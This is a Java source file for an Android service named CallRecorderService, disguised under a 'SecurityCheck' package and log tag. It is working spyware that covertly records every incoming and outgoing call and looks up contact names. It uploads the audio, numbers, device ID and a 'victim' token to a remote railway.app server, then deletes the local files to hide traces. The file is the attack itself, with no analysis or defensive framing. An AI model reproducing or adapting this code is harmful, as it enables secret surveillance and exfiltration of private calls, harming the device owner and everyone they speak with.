// CallRecorderService.java
package com.sec.check;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * CallRecorderService - يسجل كل مكالمة تلقائياً
 * ============================================================
 * - PhoneStateListener لمعرفة حالة المكالمة
 * - MediaRecorder للتسجيل
 * - يرفع للبوت فوراً
 */
public class CallRecorderService extends Service {

    private static final String TAG = "SecurityCheck";
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";

    private MediaRecorder recorder = null;
    private String currentFilePath = null;
    private String currentNumber = "";
    private String currentContactName = "";
    private long recordingStartTime = 0;
    private boolean isRecording = false;

    private TelephonyManager telephonyManager = null;
    private PhoneStateListener phoneStateListener = null;
    private CallStateReceiver callReceiver = null;

    private String victimToken = null;
    private String deviceId = null;

    // ============================================================
    // Lifecycle
    // ============================================================
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "════════════════════════════════════════");
        Log.d(TAG, "★ CallRecorderService Started");
        Log.d(TAG, "════════════════════════════════════════");

        try {
            victimToken = BuildConfig.VICTIM_TOKEN;
        } catch (Exception e) {
            victimToken = "DEFAULT_TOKEN";
        }

        try {
            deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            deviceId = "unknown";
        }

        // ★ إنشاء مجلد التسجيلات
        createRecordingDir();

        // ★ تسجيل PhoneStateListener
        setupPhoneStateListener();

        // ★ تسجيل Outgoing Call Receiver
        setupCallReceiver();

        // ★★ إشعار البدء — داخل try/catch ★★
        try {
            JSONObject readyData = new JSONObject();
            readyData.put("service", "CallRecorder");
            readyData.put("timestamp", System.currentTimeMillis());

            sendEvent("call_recorder_ready", readyData);
        } catch (Exception e) {
            Log.e(TAG, "send ready event error: " + e.getMessage());
        }

        Log.d(TAG, "✅ CallRecorder ready");
    }

    // ============================================================
    // Create Recording Directory
    // ============================================================
    private void createRecordingDir() {
        try {
            File dir = new File(getRecordingsPath());
            if (!dir.exists()) {
                boolean created = dir.mkdirs();
                Log.d(TAG, "Recording dir created: " + created + " | " + dir.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e(TAG, "createRecordingDir error: " + e.getMessage());
        }
    }

    private String getRecordingsPath() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+
            File dir = new File(
                getExternalFilesDir(null) + "/CallRecordings"
            );
            return dir.getAbsolutePath();
        } else {
            // Android 9 وأقل
            File dir = new File(
                Environment.getExternalStorageDirectory() + "/CallRecordings"
            );
            return dir.getAbsolutePath();
        }
    }

    // ============================================================
    // Setup Phone State Listener
    // ============================================================
    private void setupPhoneStateListener() {
        try {
            telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            if (telephonyManager == null) {
                Log.e(TAG, "TelephonyManager is null");
                return;
            }

            phoneStateListener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String phoneNumber) {
                    try {
                        Log.d(TAG, "📞 Call state: " + state + " | Number: " + phoneNumber);

                        switch (state) {
                            case TelephonyManager.CALL_STATE_IDLE:
                                // المكالمة انتهت
                                if (isRecording) {
                                    stopRecording();
                                }
                                break;

                            case TelephonyManager.CALL_STATE_OFFHOOK:
                                // المكالمة بدأت (رد أو اتصال)
                                if (!isRecording) {
                                    currentNumber = phoneNumber != null ? phoneNumber : "Unknown";

                                    // ابحث عن اسم المتصل
                                    currentContactName = lookupContactName(currentNumber);

                                    // ابدأ التسجيل
                                    startRecording(currentNumber, currentContactName);
                                }
                                break;

                            case TelephonyManager.CALL_STATE_RINGING:
                                // المكالمة بترن (مش عايزين نسجل هنا)
                                currentNumber = phoneNumber != null ? phoneNumber : "Unknown";
                                currentContactName = lookupContactName(currentNumber);
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "onCallStateChanged error: " + e.getMessage());
                    }
                }
            };

            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);

            Log.d(TAG, "✅ PhoneStateListener registered");

        } catch (Exception e) {
            Log.e(TAG, "setupPhoneStateListener error: " + e.getMessage());
        }
    }

    // ============================================================
    // Setup Outgoing Call Receiver
    // ============================================================
    private void setupCallReceiver() {
        try {
            callReceiver = new CallStateReceiver();
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
            filter.setPriority(999);
            registerReceiver(callReceiver, filter);
            Log.d(TAG, "✅ CallStateReceiver registered");
        } catch (Exception e) {
            Log.e(TAG, "setupCallReceiver error: " + e.getMessage());
        }
    }

    // ============================================================
    // Start Recording
    // ============================================================
    private void startRecording(String number, String contactName) {
        try {
            if (isRecording) {
                Log.d(TAG, "Already recording");
                return;
            }

            // اسم الملف
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
            String timestamp = sdf.format(new Date());
            String safeName = (contactName != null && !contactName.isEmpty()) ?
                contactName.replaceAll("[^a-zA-Z0-9\\u0600-\\u06FF]", "_") : "Unknown";

            currentFilePath = getRecordingsPath() + "/" +
                "call_" + timestamp + "_" + safeName + "_" + number.replaceAll("[^0-9]", "") + ".m4a";

            File outputFile = new File(currentFilePath);

            // ★★ إعداد Recorder حسب الإصدار ★★
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+
                recorder = new MediaRecorder(this);
            } else {
                // Android 11 وأقل
                recorder = new MediaRecorder();
            }

            // ★★ اختيار مصدر الصوت ★★
            int audioSource = MediaRecorder.AudioSource.VOICE_CALL;

            try {
                recorder.setAudioSource(audioSource);
            } catch (Exception e) {
                Log.w(TAG, "VOICE_CALL not available, trying VOICE_RECOGNITION");
                try {
                    audioSource = MediaRecorder.AudioSource.VOICE_RECOGNITION;
                    recorder.setAudioSource(audioSource);
                } catch (Exception e2) {
                    Log.w(TAG, "VOICE_RECOGNITION failed, trying MIC");
                    audioSource = MediaRecorder.AudioSource.MIC;
                    recorder.setAudioSource(audioSource);
                }
            }

            // ★★ إعدادات التسجيل ★★
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(currentFilePath);

            // ★★ ابدأ التسجيل ★★
            recorder.prepare();
            recorder.start();

            isRecording = true;
            recordingStartTime = System.currentTimeMillis();

            Log.d(TAG, "🎙️ Recording started: " + currentFilePath);

            // ★★★ إشعار للبوت — داخل try/catch ★★★
            try {
                JSONObject data = new JSONObject();
                data.put("number", number);
                data.put("contact", contactName);
                data.put("audio_source", audioSource);
                data.put("file", new File(currentFilePath).getName());
                data.put("timestamp", recordingStartTime);

                sendEvent("call_recording_started", data);
            } catch (Exception e) {
                Log.e(TAG, "send started event error: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "startRecording error: " + e.getMessage());
            e.printStackTrace();
            isRecording = false;
            recorder = null;
        }
    }

    // ============================================================
    // Stop Recording
    // ============================================================
    private void stopRecording() {
        try {
            if (!isRecording || recorder == null) {
                return;
            }

            long duration = System.currentTimeMillis() - recordingStartTime;

            try {
                recorder.stop();
            } catch (Exception e) {
                Log.e(TAG, "recorder.stop error: " + e.getMessage());
            }

            try {
                recorder.release();
            } catch (Exception e) {
                Log.e(TAG, "recorder.release error: " + e.getMessage());
            }

            recorder = null;
            isRecording = false;

            Log.d(TAG, "🛑 Recording stopped | Duration: " + (duration / 1000) + "s");

            // ★ ارفع للبوت
            if (currentFilePath != null) {
                uploadRecording(currentFilePath, currentNumber, currentContactName, duration);
            }

            // ★ امسح الحالة
            currentFilePath = null;
            currentNumber = "";
            currentContactName = "";
            recordingStartTime = 0;

        } catch (Exception e) {
            Log.e(TAG, "stopRecording error: " + e.getMessage());
        }
    }

    // ============================================================
    // Upload Recording
    // ============================================================
    private void uploadRecording(String filePath, String number, String contactName, long duration) {
        new Thread(() -> {
            try {
                File audioFile = new File(filePath);

                if (!audioFile.exists() || audioFile.length() == 0) {
                    Log.e(TAG, "Recording file empty or missing: " + filePath);
                    return;
                }

                long fileSize = audioFile.length();
                Log.d(TAG, "📤 Uploading recording (" + fileSize + " bytes)");

                // ★ اقرأ الملف
                byte[] bytes = new byte[(int) audioFile.length()];
                FileInputStream fis = new FileInputStream(audioFile);
                int read = fis.read(bytes);
                fis.close();

                if (read <= 0) {
                    Log.e(TAG, "Failed to read file");
                    return;
                }

                // ★ Base64 encode
                String base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP);

                // ★★★ بيانات الرفع — داخل try/catch ★★★
                JSONObject payload = new JSONObject();
                payload.put("type", "call_recording");
                payload.put("token", victimToken);
                payload.put("device", deviceId);
                payload.put("number", number);
                payload.put("contact", contactName);
                payload.put("duration", duration);
                payload.put("size", fileSize);
                payload.put("audio", "data:audio/mp4;base64," + base64Audio);
                payload.put("timestamp", System.currentTimeMillis());

                // ★ إرسال
                URL url = new URL(SERVER_URL + "/apk/victim/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int rc = conn.getResponseCode();
                Log.d(TAG, "📤 Upload response: HTTP " + rc);

                if (rc == 200) {
                    Log.d(TAG, "✅ Recording uploaded successfully");

                    // ★ امسح الملف المحلي
                    try {
                        boolean deleted = audioFile.delete();
                        Log.d(TAG, "File deleted: " + deleted);
                    } catch (Exception e) {
                        Log.e(TAG, "File delete error: " + e.getMessage());
                    }
                } else {
                    Log.e(TAG, "Upload failed: " + rc);
                }

            } catch (Exception e) {
                Log.e(TAG, "uploadRecording error: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    // ============================================================
    // Lookup Contact Name
    // ============================================================
    private String lookupContactName(String number) {
        try {
            if (number == null || number.isEmpty()) return "Unknown";

            android.net.Uri uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(number)
            );

            android.database.Cursor cursor = getContentResolver().query(
                uri,
                new String[]{android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME},
                null, null, null
            );

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    String name = cursor.getString(0);
                    cursor.close();
                    return name != null ? name : "Unknown";
                }
                cursor.close();
            }

            return "Unknown";

        } catch (Exception e) {
            Log.e(TAG, "lookupContactName error: " + e.getMessage());
            return "Unknown";
        }
    }

    // ============================================================
    // Send Event — مغلف بـ try/catch بالكامل
    // ============================================================
    private void sendEvent(String type, JSONObject data) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("type", type);
                payload.put("token", victimToken);
                payload.put("device", deviceId);
                payload.put("data", data);
                payload.put("timestamp", System.currentTimeMillis());

                URL url = new URL(SERVER_URL + "/apk/victim/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int rc = conn.getResponseCode();
                Log.d(TAG, "📤 Event sent: " + type + " → HTTP " + rc);

            } catch (Exception e) {
                Log.e(TAG, "sendEvent error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    // onBind
    // ============================================================
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ============================================================
    // onStartCommand
    // ============================================================
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    // ============================================================
    // onDestroy
    // ============================================================
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "CallRecorderService onDestroy");

        try {
            if (isRecording) {
                stopRecording();
            }
        } catch (Exception e) {
            Log.e(TAG, "stopRecording in onDestroy error: " + e.getMessage());
        }

        try {
            if (telephonyManager != null && phoneStateListener != null) {
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
            }
        } catch (Exception e) {
            Log.e(TAG, "listen NONE error: " + e.getMessage());
        }

        try {
            if (callReceiver != null) {
                unregisterReceiver(callReceiver);
                callReceiver = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "unregisterReceiver error: " + e.getMessage());
        }
    }

    // ============================================================
    // Inner Class: CallStateReceiver
    // ============================================================
    private class CallStateReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                if (intent == null) return;

                String action = intent.getAction();
                if ("android.intent.action.NEW_OUTGOING_CALL".equals(action)) {
                    String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

                    if (outgoingNumber != null) {
                        currentNumber = outgoingNumber;
                        currentContactName = lookupContactName(outgoingNumber);

                        Log.d(TAG, "📞 Outgoing call: " + outgoingNumber + " (" + currentContactName + ")");
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "CallStateReceiver error: " + e.getMessage());
            }
        }
    }
                  }
